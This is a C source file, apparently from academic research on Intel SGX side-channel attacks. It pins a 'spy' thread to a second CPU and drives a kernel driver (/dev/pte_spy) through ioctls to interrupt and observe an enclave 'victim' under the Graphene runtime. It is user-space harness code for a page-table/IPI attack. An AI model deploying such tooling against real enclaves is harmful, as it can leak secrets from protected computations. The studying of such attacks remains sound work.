#define _GNU_SOURCE

#include <sched.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <linux/types.h>
#include <sys/ioctl.h>
// #include "../spy-kernel/pte_attack.h"

#include "sgx_attacker.h"

/* ===================== ATTACK CONFIGURATION  ===================== */
#define ENCLAVE_CPU_NB          0
#define SPY_CPU_NB              1
#define SYSDUMP_CONTROL_SPY     0

/* ===================== SPY/VICTIM THREAD CREATION  ===================== */

int gsgx_device;
int ioctl_rv;
void *dummy_pt = NULL;

/* ===================== START  ===================== */
// a dirty way to bypass the compiler include issues

#define SPY_DRIVER "/dev/pte_spy"

/* IO functions */
#define GSGX_IOCTL_SPY_START        _IOR('p', 0x04, struct gsgx_spy_info)
#define GSGX_IOCTL_SPY_STOP         _IOR('p', 0x05, void*)
#define GSGX_IOCTL_SPY_WAIT         _IOR('p', 0x06, void*)
#define GSGX_IOCTL_SPY_INIT         _IOR('p', 0x07, void*)

typedef unsigned long long uint64_t;
struct gsgx_spy_info
{
    uint64_t ipi_cpu_nb;
    uint64_t cur_tcs;
    uint64_t aep;
};

struct victim_ipi_init_info {
    int victim_cpu;
    uint64_t cur_tcs;
    uint64_t erip_base;
    uint64_t aep;
};

/* ===================== END  ===================== */

#define IOCTL_ASSERT(f, arg) \
	if ( ( ioctl_rv = ioctl( gsgx_device, f, arg ) ) != 0 ) \
	{ \
		printf( "\t--> ioctl " #f " failed (error %i)\n", ioctl_rv ); \
		abort(); \
	}

void claim_cpu(char *me, int nb)
{
    cpu_set_t cpuset; 
    CPU_ZERO(&cpuset);
    CPU_SET(nb , &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
    printf("%s: continuing on CPU %d\n", me, sched_getcpu());
}

volatile int spy_created = 0;
pthread_t pth_spy;

#if CONFIG_EDBGRD_RIP
extern void async_exit_pointer (void);
extern __thread void * current_tcs;
// the above pointers are only needed for debug
// see https://github.com/jovanbulck/sgx-pte/blob/df7cc7a23444e346e5af43da4bbe4095818b07b3/Pal/src/host/Linux-SGX/sgx_entry.S#L26
#else
void* async_exit_pointer = NULL;
__thread void * current_tcs = NULL;
#endif

void *thrSpy(void *arg)
{
    claim_cpu("spy", SPY_CPU_NB);   
    
    /*
     * Spy thread continues in kernel mode.
     */
    struct gsgx_spy_info spy_info;
    spy_info.ipi_cpu_nb = ENCLAVE_CPU_NB;
    spy_info.cur_tcs = (uint64_t) arg;
    spy_info.aep = (uint64_t) async_exit_pointer; 
   
    spy_created = 1;
    printf("spy: before GSGX_IOCTL_SPY_START\n");
    IOCTL_ASSERT(GSGX_IOCTL_SPY_START, &spy_info);
    printf("spy: after GSGX_IOCTL_SPY_START\n");
    return NULL;
}

void start_spy_thread(void)
{
    printf("\n------------\nvictim:hi from start_spy_thread!\n");
    printf("victim: cur_tcs is %p\n", current_tcs);

    printf("victim: creating spy thread..\n");
    pthread_create(&pth_spy, NULL, thrSpy, current_tcs);

    claim_cpu("victim", ENCLAVE_CPU_NB);
    
    /*
     * Wait until spy thread is created and ready in kernel mode; victim thread
     * continues to run through enclave, and will eventually call
     * stop_spy_thread().
     */
    while(!spy_created);
    printf("victim: before GSGX_IOCTL_SPY_WAIT\n");
    IOCTL_ASSERT(GSGX_IOCTL_SPY_WAIT, &dummy_pt);
    printf("victim: before GSGX_IOCTL_SPY_WAIT\n");
    
    printf("----------\n\n");
}

void stop_spy_thread(void)
{
    printf("\n-----------\nvictim: hi from stop_spy_thread on CPU %d\n",
        sched_getcpu());

    IOCTL_ASSERT(GSGX_IOCTL_SPY_STOP, &dummy_pt);

    printf("victim: waiting for completion spy thread..\n");
    pthread_join(pth_spy, &dummy_pt);
    
    printf("victim: all done!\n------------\n\n");
}

/*
 * Called from untrusted Graphene runtime, after enclave creation.
 */
void sgx_enter_victim(void)
{
    gsgx_device = open(SPY_DRIVER, O_RDWR);
    if (gsgx_device == -1)
        abort();
#if SYSDUMP_CONTROL_SPY
    printf("sgx_enter_victim: waiting to start spy thread after sysdump...\n");
#else
    IOCTL_ASSERT(GSGX_IOCTL_SPY_INIT, &dummy_pt);
    start_spy_thread();
#endif
}

/*
 * Called from untrusted Graphene runtime, on custom sysdump ocall.
 */
void sgx_sysdump_victim( int arg )
{
#if SYSDUMP_CONTROL_SPY
    if (!arg)
    {
        start_spy_thread();
    }
    else if (arg == 0x1)
    {
        stop_spy_thread();
    }
#endif
}

/*
 * Called from untrusted Graphene runtime, upon exit syscall.
 */
void sgx_exit_victim(void)
{
#if SYSDUMP_CONTROL_SPY
    printf("sgx_exit_victim: spy thread should be stopped by now...\n");
#else
    stop_spy_thread();
#endif
    if (gsgx_device !=- 1)
        close(gsgx_device);
}